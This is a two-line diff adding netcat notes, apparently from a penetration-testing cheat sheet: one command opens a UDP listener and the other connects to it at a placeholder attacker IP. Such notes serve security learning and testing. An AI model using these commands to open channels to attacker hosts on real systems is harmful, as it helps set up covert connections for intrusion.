@@ -1,0 +1,2 @@
+nc -u -lnvp <port>  --> to create a UDP listener
+nc -u -nv <attacker_ip> <port>  --> to connect to the UDP listener
